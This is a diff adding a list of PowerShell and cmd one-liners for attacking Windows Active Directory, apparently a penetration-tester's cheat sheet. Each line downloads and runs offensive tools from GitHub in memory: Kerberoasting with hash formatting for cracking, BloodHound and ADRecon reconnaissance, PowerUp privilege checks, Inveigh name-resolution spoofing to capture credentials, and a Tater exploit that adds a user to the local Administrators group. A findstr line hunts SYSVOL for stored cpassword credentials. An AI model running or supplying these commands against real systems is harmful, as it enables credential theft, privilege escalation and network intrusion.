@@ -1,0 +1,20 @@
+$urls = @("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1","https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); $urls |% {iex (New-Object System.Net.WebClient).DownloadString($_);}; gci function:\ | Select-String "Invoke-"; Invoke-Kerberoast
+
+$urls = @("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1","https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); $urls |% {iex (New-Object System.Net.WebClient).DownloadString($_);}; gci function:\ | Select-String "Invoke-"; Invoke-Kerberoast -OutputFormat John | Select-Object -ExpandProperty Hash |% {$_.replace(':',':$krb5tgs$23$')} 
+
+$domain="lab.test" ;$server="10.0.0.1"; $cred = (Get-Credential "user01@$domain"); $urls = @("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1","https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); $urls |% {iex (New-Object System.Net.WebClient).DownloadString($_);}; gci function:\ | Select-String "Invoke-"; Invoke-Kerberoast -OutputFormat John -Server $server -Domain $domain -Credential $cred | Select-Object -ExpandProperty Hash |% {$_.replace(':',':$krb5tgs$23$')}
+
+IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')
+
+IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks
+
+findstr /S cpassword %logonserver%\sysvol\*.xml
+findstr /S cpassword $env:logonserver\sysvol\*.xml
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -HTTPAuth Basic
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1');invoke-Tater -Command 'net localgroup Administrators user /add'
+
+
